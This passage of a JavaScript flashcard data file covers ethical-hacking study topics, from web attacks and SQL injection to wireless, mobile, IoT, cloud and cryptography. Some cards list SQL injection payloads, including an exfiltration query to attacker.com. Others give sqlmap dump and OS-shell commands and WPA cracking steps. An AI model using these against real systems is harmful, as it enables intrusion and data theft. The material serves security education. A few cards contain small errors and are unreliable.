                        { q: "What is OWASP and the OWASP Top 10?", a: "- Open Web Application Security Project\n- Industry-standard awareness document for web application security\n- Top 10 categories of critical risks:\n  1) Broken Access Control\n  2) Cryptographic Failures\n  3) Injection\n  4) Insecure Design\n  5) Security Misconfiguration\n  6) Vulnerable Components\n  7) Authentication Failures\n  8) Software & Data Integrity\n  9) Security Logging Failures\n  10) Server-Side Request Forgery" },
                        { q: "What is Injection vulnerability?", a: "- Attacker sends untrusted data to interpreter\n- SQL Injection: Inject SQL commands via web input\n- Command Injection: Execute OS commands\n- LDAP Injection, XML Injection, XPath Injection\n- Prevention: Parameterized queries, input validation, output encoding" },
                        { q: "What is Broken Access Control?", a: "- Users can access resources/functions they should not\n- Examples:\n  - Direct object reference (access other users' data)\n  - Privilege escalation (admin functions without authorization)\n  - Vertical/Horizontal privilege bypass\n- Prevention: Enforce access control server-side, use security frameworks" },
                        { q: "What are types of XSS attacks?", a: "- Reflected XSS: Malicious script sent via URL, reflected in response\n- Stored XSS: Script stored on server (database), served to all users\n- DOM-based XSS: Client-side JavaScript modifies DOM without server interaction\n- Each type has different impact and prevention requirements" },
                        { q: "How to prevent XSS?", a: "- Input validation: Reject suspicious input\n- Output encoding: Encode special characters (<>\\"'&)\n- Content-Security-Policy header: Restrict script sources\n- HttpOnly flag on cookies: Prevent document.cookie access\n- Use frameworks that auto-escape output (React, Angular)" }
                    ]
                },
                {
                    title: "CSRF, Clickjacking & Web App Tools",
                    cards: [
                        { q: "What is Cross-Site Request Forgery (CSRF)?", a: "- Forces authenticated user to perform unwanted action\n- Uses victim's active session/cookies\n- Prevention:\n  - Anti-CSRF tokens per session/user\n  - SameSite cookie attribute\n  - Verify custom headers (X-Requested-With)\n  - Require re-authentication for sensitive actions" },
                        { q: "What is Clickjacking?", a: "- Tricks user into clicking hidden/misleading elements\n- Uses invisible iframe overlaying legitimate content\n- User thinks they click button but actually triggers hidden action\n- Prevention:\n  - X-Frame-Options: DENY or SAMEORIGIN\n  - Content-Security-Policy frame-ancestors directive" },
                        { q: "What tools are used for Web Application security testing?", a: "- OWASP ZAP: Open-source web vulnerability scanner\n- Burp Suite: Manual web security testing toolkit\n- Acunetix: Automated web vulnerability scanner\n- Nikto: Web server scanner\n- SQLmap: SQL injection tool\n- Wfuzz: Web fuzzer\n- Skipfish: Web application security scanner\n- Arachni: Multi-framework web scanner" }
                    ]
                },
                {
                    title: "Web App Security Overview",
                    cards: [
                        { q: "What is the OWASP Top 10?", a: "A standard awareness document for web application security representing a broad consensus about the most critical security risks: Injection, Broken Authentication, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, XSS, Insecure Deserialization, Vulnerable Components, Insufficient Logging." },
                        { q: "What is Cross-Site Scripting (XSS)?", a: "Injecting malicious scripts into web pages viewed by other users. Types: Stored (persisted on server), Reflected (from URL parameters), DOM-based (client-side only). Can steal cookies, session tokens, and deface websites." },
                        { q: "What is Cross-Site Request Forgery (CSRF)?", a: "Forcing an authenticated user to perform unintended actions on a web application. The attacker tricks the victim's browser into making requests with their credentials. Prevention: anti-CSRF tokens, SameSite cookies." }
                    ]
                }
            ]
        },
        {
            id: 15,
            title: "SQL Injection",
            sections: [
                {
                    title: "SQL Injection Types & Tools",
                    cards: [
                        { q: "What are the types of SQL Injection?", a: "- In-band SQLi (Classic):\n  - Error-based: Database errors reveal info\n  - Union-based: UNION SELECT combines queries\n- Inferential SQLi (Blind):\n  - Boolean-based: True/false questions via page response\n  - Time-based: DELAY/BENCHMARK to detect timing differences\n- Out-of-band SQLi: DNS/HTTP exfiltration when in-band fails" },
                        { q: "What is UNION-based SQL Injection?", a: "- Uses UNION operator to combine results of original query with attacker's query\n- Requires matching number of columns (use ORDER BY to find count)\n- Example: ' UNION SELECT username, password FROM users--\n- Data returned in same response" },
                        { q: "What is Blind SQL Injection?", a: "- No direct data returned from injection\n- Boolean-based: Application response changes based on true/false condition\n  - Example: ' AND 1=1 (true) vs ' AND 1=2 (false)\n- Time-based: Use database-specific sleep functions\n  - SQL Server: WAITFOR DELAY '0:0:5'\n  - MySQL: SLEEP(5)\n  - PostgreSQL: pg_sleep(5)" },
                        { q: "What is Out-of-Band SQL Injection?", a: "- Uses different channel to exfiltrate data\n- DNS exfiltration: Construct DNS query with stolen data\n  - Example: SELECT LOAD_FILE(CONCAT('\\\\', table_name, '.attacker.com\\'))\n- HTTP requests to attacker-controlled server\n- Rare, requires specific DB configuration" },
                        { q: "What tools are used for SQL Injection?", a: "- SQLmap: Most popular automated SQLi tool\n  - sqlmap -u 'url?id=1' --dbs — list databases\n  - sqlmap -u 'url?id=1' -D dbname --tables — list tables\n  - sqlmap -u 'url?id=1' -D dbname -T tablename --dump — dump data\n- Havij: GUI-based SQLi tool (Windows)\n- Mantra: Automated SQL injection tool\n- Modlishka: Phishing + SQLi" },
                        { q: "What is SQLmap usage?", a: "- Basic: sqlmap -u 'http://target/page?id=1'\n- Databases: sqlmap -u url --dbs\n- Tables: sqlmap -u url -D dbname --tables\n- Dump: sqlmap -u url -D dbname -T tbl --dump\n- Shell: sqlmap -u url --os-shell\n- Passwords: sqlmap -u url --passwords\n- Bypass WAF: sqlmap -u url --batch --technique=B" }
                    ]
                },
                {
                    title: "Database Exploitation & SQLi Prevention",
                    cards: [
                        { q: "What can be done after successful SQL Injection?", a: "- Extract data from database (usernames, passwords, PII)\n- Bypass authentication\n- Modify/delete data\n- Execute OS commands via database features:\n  - MySQL: INTO OUTFILE, EXECUTE\n  - SQL Server: xp_cmdshell\n  - PostgreSQL: COPY FROM PROGRAM" },
                        { q: "What is SQL Injection for Authentication Bypass?", a: "- Common technique: ' OR 1=1--\n- Username field: admin'--\n- Password field: anything\n- Comments out rest of query, makes condition always true\n- Alternative: ' OR ''='\n- Can target login forms, API endpoints, search functions" },
                        { q: "How to prevent SQL Injection?", a: "- Use Parameterized Queries (Prepared Statements)\n- Use Stored Procedures with parameterization\n- Input validation and sanitization\n- Least privilege database accounts\n- WAF (Web Application Firewall) rules\n- Regular security testing and code review\n- ORM frameworks (separate data from code)\n- Error handling: Never expose DB errors to users" },
                        { q: "What are common SQL Injection payload examples?", a: "- Authentication bypass: ' OR 1=1--\n- UNION injection: ' UNION SELECT NULL,NULL,NULL--\n- Stacked queries: '; DROP TABLE users--\n- Comment sequences: --, #, /*, ;*/\n- Encoding tricks: URL encoding, Unicode, hex encoding\n- Second-order SQLi: Stored then executed later" }
                    ]
                },
                {
                    title: "SQL Injection Overview",
                    cards: [
                        { q: "What is SQL injection?", a: "A code injection technique where malicious SQL statements are inserted into input fields to execute arbitrary SQL commands. Can bypass authentication, extract data, modify/delete records, and potentially gain server access." },
                        { q: "What are types of SQL injection?", a: "1) In-band (Classic) — UNION-based, Error-based\n2) Blind (Inferential) — Boolean-based, Time-based\n3) Out-of-band — using DNS/HTTP protocols" },
                        { q: "What is the 'OR 1=1' injection?", a: "A classic SQL injection payload that always returns true. Example: username=' OR 1=1-- bypasses login by making the WHERE clause always evaluate to true, returning all users." },
                        { q: "How do you prevent SQL injection?", a: "1) Parameterized queries (prepared statements)\n2) Input validation and sanitization\n3) Stored procedures\n4) Least privilege database accounts\n5) Web Application Firewall (WAF)\n6) ORM frameworks" }
                    ]
                }
            ]
        },
        {
            id: 16,
            title: "Hacking Wireless Networks",
            sections: [
                {
                    title: "Wireless Network Attacks & Defense",
                    cards: [
                        { q: "What are Wireless Network attack types?", a: "- Rogue Access Points: Unauthorized APs on network\n- Evil Twin: Fake AP with legitimate-looking name\n- WarDriving: Driving around searching for wireless networks\n- WarChalking: Symbolic notation of found networks\n- Deauthentication Attack: Force clients off network\n- MAC Address Cloning/Spoofing" },
                        { q: "What is Wireless Encryption standards?", a: "- WEP (Wired Equivalent Privacy): Broken, easily cracked\n- WPA (Wi-Fi Protected Access): Improvement over WEP but has weaknesses\n- WPA2: AES encryption, most common (vulnerable to dictionary attacks)\n- WPA3: Latest, SAE authentication, forward secrecy\n- WPS (Wi-Fi Protected Setup): PIN vulnerability, easy to crack" },
                        { q: "What is the WPA Handshake attack?", a: "- Captures 4-way handshake between client and AP\n- Once captured, offline dictionary/brute force attack on PSK\n- Tools: aircrack-ng suite\n- Process:\n  1) Monitor mode: airmon-ng start wlan0\n  2) Capture handshake: airodump-ng --capture handshark.cap\n  3) Deauth client to force reconnection\n  4) Crack: aircrack-ng -w wordlist.txt handshark.cap" },
                        { q: "What is an Evil Twin attack?", a: "- Attacker creates fake wireless AP with same SSID as legitimate one\n- Clients connect to evil twin thinking it's real\n- Attacker can intercept all traffic, capture credentials\n- Tools: airbase-ng, hostapd, wifiphisher\n- Prevention: Enterprise authentication (802.1X), monitor for rogue APs" },
                        { q: "What is a Rogue Access Point?", a: "- Unauthorized AP connected to secure network\n- Can be installed by employees without IT knowledge\n- Provides backdoor for attackers\n- Detection: Wireless intrusion detection systems (WIDS)\n- Prevention: Network access control policies" },
                        { q: "What is WarDriving?", a: "- Searching for wireless networks while moving through an area\n- Uses laptop/phone with WiFi adapter, GPS\n- Tools: NetSpot, InSSIDer, Android WiFi Analyzer\n- Can reveal: open networks, WEP/WPA networks, hidden SSIDs, signal strength" },
                        { q: "What tools are used for Wireless attacks?", a: "- Aircrack-ng suite: Monitor mode, packet capture, crack WEP/WPA\n- Kismet: Wireless network detector/sniffer\n- Reaver: WPS attack tool\n- Fern WiFi Cracker: GUI-based wireless security tool\n- Bully: WPS offline/online attack\n- Cowpatty: Precomputed PMKID attacks" },
                        { q: "What is PMKID Attack?", a: "- Targets WPA2-Personal networks\n- Captures PMKID from first handshake message\n- Faster than full handshake capture\n- Tool: aircrack-ng with hashcat\n- Requires: Station connected to AP or known SSID" },
                        { q: "How to secure Wireless Networks?", a: "- Use WPA3 (or WPA2-AES if WPA3 unavailable)\n- Disable WPS completely\n- Strong, complex PSK passwords (12+ characters)\n- Disable SSID broadcasting (limited effectiveness)\n- MAC address filtering (easily spoofed)\n- Regular firmware updates\n- Enterprise authentication (802.1X/RADIUS)\n- Network segmentation for guest WiFi\n- Regular wireless site surveys" },
                        { q: "What is Wireless Intrusion Prevention System (WIPS)?", a: "- Detects and blocks unauthorized wireless devices\n- Identifies rogue APs and evil twins\n- Monitors for deauth attacks, spoofing\n- Examples: Cisco IPS, Aruba Wireless IDS\n- Can automatically block malicious MAC addresses" }
                    ]
                },
                {
                    title: "Wireless Network Attacks Overview",
                    cards: [
                        { q: "What are common wireless attack types?", a: "1) Eavesdropping/Sniffing\n2) Rogue access points\n3) Evil twin attacks\n4) War driving\n5) Jamming\n6) Deauthentication attacks\n7) WEP/WPA cracking" },
                        { q: "What is an evil twin attack?", a: "Setting up a fake wireless access point that mimics a legitimate SSID. Users connect thinking it's the real network, and the attacker can intercept all traffic or steal credentials." },
                        { q: "How do you secure wireless networks?", a: "1) Use WPA3 (or WPA2 if WPA3 unavailable)\n2) Disable WPS\n3) Hide SSID (security through obscurity, not sufficient alone)\n4) MAC address filtering\n5) Regular firmware updates\n6) Enterprise authentication (802.1X/RADIUS)" }
                    ]
                }
            ]
        },
        {
            id: 17,
            title: "Hacking Mobile Platforms",
            sections: [
                {
                    title: "Android & iOS Security",
                    cards: [
                        { q: "What are Android-specific vulnerabilities?", a: "- APK reverse engineering: Extract code, find API keys\n- Insecure data storage: SQLite databases, shared preferences\n- Insufficient transport layer encryption\n- Weak server-side controls for API endpoints\n- Code obfuscation bypass (ProGuard)\n- Malicious third-party app stores" },
                        { q: "What is Android App Security Testing?", a: "- Static Analysis:\n  - Decompile APK: apktool, jd-gui, JADX\n  - Analyze AndroidManifest.xml for permissions\n  - Look for hardcoded credentials/API keys\n  - Check SSL pinning implementation\n- Dynamic Analysis:\n  - Run in emulator/sandbox\n  - Intercept traffic with Burp Suite/mitmproxy\n  - Use Frida for runtime manipulation" },
                        { q: "What are iOS-specific vulnerabilities?", a: "- Jailbreaking: Removes Apple restrictions, exposes system files\n- Insecure data storage: Keychain misuse, local database exposure\n- Backup encryption disabled\n- SSL pinning bypass\n- ClassKit/Handoff vulnerabilities\n- iMessage exploit vectors" },
                        { q: "What is iOS Jailbreaking?", a: "- Process of removing Apple restrictions on iOS devices\n- Risks:\n  - Bypasses App Store security controls\n  - Exposes system to malware\n  - Breaks code signing\n  - Keychain data exposure\n  - No OTA updates possible\n- Detection: Mobile Device Management (MDM) policies" },
                        { q: "What iOS security tools are used in pentesting?", a: "- Cydia Impactor: Install unsigned apps\n- Frida: Dynamic instrumentation framework\n- Objection: Runtime mobile exploration\n- Charles Proxy: HTTP debugging\n- Xcode: iOS app development/testing\n- Hopper Disassembler: Static analysis" }
                    ]
                },
                {
                    title: "Mobile Malware & MDM",
                    cards: [
                        { q: "What are types of Mobile Malware?", a: "- Trojans: Appear legitimate, perform malicious actions\n- Spyware: Track location, contacts, messages\n- Ransomware: Lock device, demand payment\n- Adware: Inject unwanted ads\n- Rootkits: Gain root/jailbreak access\n- Banking Trojans: Intercept banking transactions" },
                        { q: "What is Mobile Phishing (Smishing/Phishing)?", a: "- SMS Phishing (Smishing): Fake text messages with malicious links\n- Email Phishing on mobile: Optimized for small screens\n- Vishing (Voice Phishing): Phone calls requesting sensitive info\n- QR Code Phishing (Quishing): Malicious QR codes in messages" },
                        { q: "What is Mobile Device Management (MDM)?", a: "- System for managing mobile devices in enterprise\n- Features:\n  - Remote wipe of lost/stolen devices\n  - Enforce encryption and password policies\n  - App whitelisting/blacklisting\n  - VPN configuration distribution\n  - Certificate management\n  - Jailbreak/root detection" },
                        { q: "How to secure Mobile Devices?", a: "- Enable device encryption (FDE/FBE)\n- Strong authentication (biometrics + PIN)\n- Keep OS and apps updated\n- Install apps only from official stores\n- Use MDM/EMM solutions in enterprise\n- Implement MAM (Mobile Application Management)\n- Remote wipe capability\n- Disable Bluetooth/WiFi when not in use" }
                    ]
                },
                {
                    title: "Mobile Security Overview",
                    cards: [
                        { q: "What are mobile security risks?", a: "1) Malicious apps (sideloading)\n2) Man-in-the-Middle attacks\n3) Network sniffing\n4) GPS tracking\n5) SMS phishing (smishing)\n6) Jailbreak/root exploits\n7) Insecure data storage" },
                        { q: "What is jailbreaking?", a: "Removing software restrictions on iOS devices to allow unauthorized app installation. Rooting is the Android equivalent. Both expose the device to security risks and void warranties." },
                        { q: "How do you secure mobile devices?", a: "1) Enable device encryption\n2) Use strong authentication (biometrics + PIN)\n3) Keep OS/apps updated\n4) Install apps only from official stores\n5) Implement MDM (Mobile Device Management)\n6) Remote wipe capability" }
                    ]
                }
            ]
        },
        {
            id: 18,
            title: "IoT & OT Hacking",
            sections: [
                {
                    title: "IoT Security & Exploitation",
                    cards: [
                        { q: "What are IoT security challenges?", a: "- Default credentials on devices\n- Lack of encryption in communication\n- Insecure firmware updates\n- No patch management mechanism\n- Physical accessibility allows tampering\n- Limited computing resources restrict security controls\n- Proprietary protocols" },
                        { q: "What is the difference between IoT and OT?", a: "- IoT (Internet of Things): Consumer/enterprise connected devices (smart home, wearables)\n- OT (Operational Technology): Industrial control systems, SCADA, PLCs\n- IoT focuses on data collection; OT focuses on physical processes\n- OT has higher safety implications if compromised" },
                        { q: "What are common IoT protocols?", a: "- MQTT: Message Queuing Telemetry Transport (lightweight pub/sub)\n- CoAP: Constrained Application Protocol (HTTP-like for IoT)\n- Zigbee: Low-power mesh networking\n- Z-Wave: Home automation protocol\n- BLE (Bluetooth Low Energy): Short-range communication\n- LoRaWAN: Long-range low-power WAN" },
                        { q: "How to attack IoT devices?", a: "- Physical access:\n  - Open device, access UART/USB serial console\n  - Extract firmware from flash chip\n  - Read configuration files for credentials\n- Network-based:\n  - Scan for open ports and services\n  - Test default credentials\n  - Exploit known CVEs\n  - Intercept unencrypted communications" },
                        { q: "What is the Mirai Botnet?", a: "- IoT botnet that infected millions of devices (cameras, routers)\n- Scanned for default credentials on Telnet/SSH\n- Used for massive DDoS attacks (Dyn DNS attack: 1Tbps+)\n- Source code leaked in 2016\n- Demonstrates IoT security risks at scale" },
                        { q: "What tools are used for IoT security testing?", a: "- Firmware analysis: binwalk, firmware-mod-kit, QEMU\n- Hardware: Bus Pirate, JTAGulator, Raspberry Pi (serial)\n- Network: Wireshark, Nmap, Burp Suite\n- Wireless: HackRF, USRP SDR\n- Specific: IoT-Scanner, Shodan for discovery" }
                    ]
                },
                {
                    title: "SCADA/ICS Security",
                    cards: [
                        { q: "What are SCADA/ICS vulnerabilities?", a: "- Legacy systems not designed for network connectivity\n- Proprietary protocols with weak/no authentication\n- Long lifecycle (10-20 years) without security updates\n- Physical safety implications of compromise\n- Stuxnet demonstrated real-world damage capability" },
                        { q: "What are common ICS/SCADA protocols?", a: "- Modbus: Industrial communication, no authentication\n- DNP3: Distributed Network Protocol (utilities)\n- BACnet: Building automation\n- PROFINET: Industrial Ethernet\n- OPC UA: Open Platform Communications (more secure)\n- S7comm: Siemens PLC communication" },
                        { q: "How to secure SCADA/ICS systems?", a: "- Network segmentation (Purdue Model)\n- ICS-specific firewalls (Nozomi, Claroty)\n- Monitor traffic with ICS IDS\n- Disable unnecessary services\n- Physical security of controllers\n- Incident response plans for OT environments\n- Regular vulnerability assessments (passive)" }
                    ]
                },
                {
                    title: "IoT & OT Overview",
                    cards: [
                        { q: "What is IoT?", a: "Internet of Things — physical devices with sensors, software, and connectivity that enable them to exchange data. Examples: smart home devices, industrial controllers, medical devices, wearables." },
                        { q: "What are IoT security challenges?", a: "1) Weak/default passwords\n2) Lack of encryption\n3) Insecure APIs\n4) No automatic updates\n5) Limited processing power for security\n6) Physical accessibility\n7) Large attack surface" },
                        { q: "What is OT (Operational Technology)?", a: "Hardware and software that detects or causes change through the direct monitoring or control of physical devices, processes, and events. Examples: SCADA systems, PLCs, industrial control systems (ICS)." },
                        { q: "What was Stuxnet?", a: "A highly sophisticated computer worm discovered in 2010 that targeted Iranian nuclear facilities. It specifically attacked Siemens SCADA systems to disrupt centrifuge operations. Considered the first cyberweapon targeting physical infrastructure." }
                    ]
                }
            ]
        },
        {
            id: 19,
            title: "Cloud Computing",
            sections: [
                {
                    title: "Cloud Service Models & Vulnerabilities",
                    cards: [
                        { q: "What are Cloud Computing service models?", a: "- IaaS (Infrastructure as a Service): Virtual machines, networks, storage\n  - AWS EC2, Azure VMs, Google Compute Engine\n- PaaS (Platform as a Service): Development platforms, databases\n  - Heroku, Google App Engine, Azure Functions\n- SaaS (Software as a Service): Complete applications\n  - Office 365, Salesforce, Google Workspace\n- FaaS (Function as a Service): Serverless computing\n  - AWS Lambda, Azure Functions" },
                        { q: "What are Cloud Deployment Models?", a: "- Public Cloud: Services provided over public internet (AWS, Azure)\n- Private Cloud: Dedicated infrastructure for single organization\n- Hybrid Cloud: Combination of public and private\n- Multi-Cloud: Using multiple cloud providers simultaneously\n- Community Cloud: Shared by organizations with common requirements" },
                        { q: "What are common Cloud security vulnerabilities?", a: "- Misconfigured storage (public S3 buckets)\n- Insecure APIs and service endpoints\n- Weak identity and access management (IAM)\n- Cross-account permission issues\n- Data exposure due to encryption misconfiguration\n- Shared technology vulnerabilities (hypervisor escapes)\n- Insufficient audit logging" },
                        { q: "What is the Shared Responsibility Model?", a: "- Cloud provider secures: Infrastructure, physical security, hypervisor\n- Customer secures: Data, access management, OS configuration, applications\n- Different for each service model:\n  - IaaS: Customer manages more (OS, apps, data)\n  - SaaS: Provider manages more (apps, runtime, OS)" },
                        { q: "How to secure Cloud Storage?", a: "- Disable public access by default\n- Enable encryption at rest and in transit\n- Use IAM policies with least privilege\n- Enable versioning and logging\n- Use presigned URLs for temporary access\n- Regular bucket policy audits\n- AWS S3 security: Block Public Access settings, MFA Delete" }
                    ]
                },
                {
                    title: "Cloud Attacks & Security Frameworks",
                    cards: [
                        { q: "What are Cloud-specific attacks?", a: "- Credential Stuffing: Using leaked credentials against cloud logins\n- API Key Exposure: Keys committed to GitHub/public repos\n- Instance Metadata Service (IMDS) attacks:\n  - SSRF to metadata endpoint (169.254.169.254)\n  - Steal temporary IAM credentials\n- Cross-tenant isolation attacks\n- Container escape from Docker/Kubernetes" },
                        { q: "What is Cloud Cryptojacking?", a: "- Unauthorized use of cloud resources for cryptocurrency mining\n- Detected via unusual CPU/billing patterns\n- Prevention:\n  - Resource usage monitoring and alerts\n  - IAM least privilege\n  - Container security scanning\n  - Regular cost audits" },
                        { q: "What cloud security tools are available?", a: "- AWS: Config, GuardDuty, Inspector, Macie, Security Hub\n- Azure: Security Center, Defender for Cloud, Policy\n- Google: Security Command Center, Cloud Security Scanner\n- Third-party: Prisma Cloud, Dome9, Wiz, Lacework\n- Open source: Prowler (AWS), Cloudsplaining (IAM analysis)" },
                        { q: "What is CIS Benchmark for Cloud?", a: "- Center for Internet Security benchmarks for cloud config\n- AWS Foundation Benchmark\n- Azure Foundation Benchmark\n- GCP Foundation Benchmark\n- Provides security configuration best practices\n- Automated compliance checking available" }
                    ]
                },
                {
                    title: "Cloud Computing Overview",
                    cards: [
                        { q: "What are cloud service models?", a: "1) IaaS (Infrastructure as a Service) — VMs, storage, networking\n2) PaaS (Platform as a Service) — development platforms\n3) SaaS (Software as a Service) — applications over internet\n4) FaaS (Function as a Service) — serverless computing" },
                        { q: "What are cloud deployment models?", a: "1) Public Cloud — shared infrastructure (AWS, Azure, GCP)\n2) Private Cloud — dedicated infrastructure\n3) Hybrid Cloud — combination of public and private\n4) Community Cloud — shared by organizations with common concerns" },
                        { q: "What are common cloud security risks?", a: "1) Data breaches\n2) Insecure APIs\n3) Misconfigured storage (S3 buckets)\n4) Account hijacking\n5) Shared technology vulnerabilities\n6) Insufficient identity management\n7) Compliance and legal issues" },
                        { q: "How do you secure cloud environments?", a: "1) Enable MFA on all accounts\n2) Encrypt data at rest and in transit\n3) Implement least privilege access\n4) Regular security audits\n5) Use cloud security posture management (CSPM) tools\n6) Monitor cloud logs and activity" }
                    ]
                }
            ]
        },
        {
            id: 20,
            title: "Cryptography",
            sections: [
                {
                    title: "Cryptography Fundamentals",
                    cards: [
                        { q: "What is cryptography?", a: "The practice of securing communication by transforming readable data (plaintext) into unreadable format (ciphertext). Used for confidentiality, integrity, authentication, and non-repudiation." },
                        { q: "What are types of encryption?", a: "- Symmetric: Same key for encryption/decryption (AES, DES, 3DES, RC4, Blowfish)\n- Asymmetric: Public/private key pairs (RSA, ECC, Diffie-Hellman)\n- Hash functions: One-way (MD5, SHA-1, SHA-256, SHA-512)" },
                        { q: "What is PKI?", a: "Public Key Infrastructure — a system for managing digital certificates and public-key encryption. Components: Certificate Authority (CA), Registration Authority (RA), Digital Certificates, CRL, and Certificate Revocation." },
                        { q: "What is a digital signature?", a: "A mathematical scheme for verifying the authenticity and integrity of digital messages/signatures. Uses asymmetric cryptography — sender encrypts hash with private key, receiver decrypts with public key." },
                        { q: "What is steganography?", a: "The practice of hiding secret data within non-secret files (images, audio, video). Unlike cryptography which hides the content, steganography hides the existence of the message itself." },
                        { q: "What is HMAC?", a: "Hash-based Message Authentication Code. Combines a cryptographic hash function with a secret key to provide both integrity and authentication. Used in IPsec, TLS, and API authentication." },
                        { q: "What is Forward Secrecy?", a: "A property of key exchange protocols where compromise of long-term keys does not compromise past session keys. Ensures past communications remain secure even if the server's private key is stolen.\n- ECDHE (Elliptic Curve Diffie-Hellman Key Exchange) provides forward secrecy" },
                        { q: "What are common hash functions and their weaknesses?", a: "- MD5: 128-bit, broken (collision attacks possible)\n- SHA-1: 160-bit, deprecated (SHAttered attack 2017)\n- SHA-256: 256-bit, secure (part of SHA-2 family)\n- SHA-512: 512-bit, secure\n- BLAKE3: Modern, fast, secure\n- Password hashing: bcrypt, scrypt, Argon2 (memory-hard)" }
                    ]
                },
                {
                    title: "Advanced Cryptography",
                    cards: [
                        { q: "What is a digital certificate?", a: "An electronic 'passport' that uses digital technology to bind a community-recognized identity to an include code known as a public key (or license number). Issued by a Certificate Authority (CA).\n- Formats: X.509 (most common)\n- Contains: Subject, Issuer, Public Key, Validity Period, Serial Number, Signature" },
                        { q: "What is the Diffie-Hellman key exchange?", a: "A method of securely exchanging cryptographic keys over a public channel.\n- Allows two parties to jointly agree upon a shared secret key without prior shared secrets\n- Based on discrete logarithm problem\n- Foundation for many secure communication protocols" },
                        { q: "What is Quantum Computing threat to cryptography?", a: "- Quantum computers could break RSA and ECC encryption\n- Shor's algorithm can factor large numbers efficiently\n- NIST working on post-quantum cryptography standards\n- Lattice-based, hash-based, and code-based crypto being standardized\n- Timeline: 10-30 years for practical quantum attacks" },
                        { q: "What is Perfect Forward Secrecy (PFS)?", a: "- PFS ensures that if a long-term private key is compromised, past session keys remain secure\n- Each session generates unique ephemeral keys\n- Implemented via ECDHE in TLS\n- Prevents mass surveillance from stored encrypted data" }
                    ]
                },
                {
                    title: "Cryptography Overview",
                    cards: [
                        { q: "What is cryptography?", a: "The practice of securing communication by transforming readable data (plaintext) into unreadable format (ciphertext). Used for confidentiality, integrity, authentication, and non-repudiation." },
                        { q: "What are types of encryption?", a: "1) Symmetric — same key for encryption/decryption (AES, DES, 3DES, RC4, Blowfish)\n2) Asymmetric — public/private key pairs (RSA, ECC, Diffie-Hellman)\n3) Hash functions — one-way (MD5, SHA-1, SHA-256, SHA-512)" },
                        { q: "What is PKI?", a: "Public Key Infrastructure — a system for managing digital certificates and public-key encryption. Components: Certificate Authority (CA), Registration Authority (RA), Digital Certificates, CRL, and Certificate Revocation." },
                        { q: "What is a digital signature?", a: "A mathematical scheme for verifying the authenticity and integrity of digital messages/signatures. Uses asymmetric cryptography — sender encrypts hash with private key, receiver decrypts with public key." },
                        { q: "What is steganography?", a: "The practice of hiding secret data within non-secret files (images, audio, video). Unlike cryptography which hides the content, steganography hides the existence of the message itself." }
                    ]
                }
            ]
        }
    ]
};
